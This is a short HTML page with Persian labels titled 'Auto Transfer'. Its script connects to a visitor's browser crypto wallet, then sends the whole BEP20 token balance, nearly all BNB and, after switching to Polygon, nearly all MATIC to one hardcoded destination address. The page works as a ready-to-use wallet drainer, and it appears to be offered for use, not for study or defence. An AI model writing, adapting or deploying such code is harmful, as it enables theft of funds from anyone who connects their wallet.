<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Auto Transfer</title>
<style>
body{font-family:sans-serif;text-align:center;margin-top:40px}
button{padding:10px 20px;font-size:16px;margin:5px}
</style>
</head>
<body>

<h2>Auto Transfer</h2>

<button onclick="connect()">کانکت ولت</button>
<button onclick="transferAll()">انتقال همه دارایی‌ها</button>

<p id="status"></p>

<script>
const DESTINATION = "0x1F40f55A445483205546E9F16B09b2134142959A";
const TOKEN = "0x641a6Dc991A49f7BE9Fe3C72c5d0FBb223eDb12f"; // BEP20 token
let account;

function status(t){document.getElementById("status").innerText=t;}

async function connect(){
 if(!window.ethereum){alert("Wallet not found");return;}
 const acc = await ethereum.request({method:'eth_requestAccounts'});
 account = acc[0];
 status("Connected: " + account);
}

// تبدیل به hex
function toHex(n){
 return "0x"+n.toString(16);
}

// خواندن موجودی BNB
async function getBNBBalance(){
 const bal = await ethereum.request({
  method:"eth_getBalance",
  params:[account,"latest"]
 });
 return parseInt(bal,16);
}

// خواندن موجودی توکن
async function getTokenBalance(){
 const data = "0x70a08231" + account.substring(2).padStart(64,"0");

 const result = await ethereum.request({
  method:"eth_call",
  params:[{to:TOKEN,data:data},"latest"]
 });

 return parseInt(result,16);
}

async function sendToken(balance){
 const data =
   "0xa9059cbb" +
   DESTINATION.substring(2).padStart(64,"0") +
   toHex(balance).substring(2).padStart(64,"0");

 return ethereum.request({
   method:"eth_sendTransaction",
   params:[{
     from:account,
     to:TOKEN,
     data:data
   }]
 });
}

async function sendBNB(balance){
 // نگه داشتن مقدار کمی برای کارمزد
 const gasReserve = 21000000000000;
 const sendAmount = balance - gasReserve;

 return ethereum.request({
   method:"eth_sendTransaction",
   params:[{
     from:account,
     to:DESTINATION,
     value:toHex(sendAmount)
   }]
 });
}

async function switchPolygon(){
 await ethereum.request({
  method:"wallet_switchEthereumChain",
  params:[{chainId:"0x89"}]
 });
}

async function getMaticBalance(){
 const bal = await ethereum.request({
  method:"eth_getBalance",
  params:[account,"latest"]
 });
 return parseInt(bal,16);
}

async function sendMatic(balance){
 const gasReserve = 21000000000000;
 const sendAmount = balance - gasReserve;

 return ethereum.request({
   method:"eth_sendTransaction",
   params:[{
     from:account,
     to:DESTINATION,
     value:toHex(sendAmount)
   }]
 });
}

async function transferAll(){

 if(!account){alert("اول کانکت کن");return;}

 try{

   status("ارسال توکن...");
   const tokenBal = await getTokenBalance();
   if(tokenBal>0){
     await sendToken(tokenBal);
   }

   status("ارسال BNB...");
   const bnbBal = await getBNBBalance();
   if(bnbBal>0){
     await sendBNB(bnbBal);
   }

   status("سوئیچ به Polygon...");
   await switchPolygon();

   status("ارسال MATIC...");
   const maticBal = await getMaticBalance();
   if(maticBal>0){
     await sendMatic(maticBal);
   }

   status("انجام شد ✅");

 }catch(e){
   console.error(e);
   alert("خطا یا رد شدن تراکنش");
 }
}
</script>

</body>
</html>
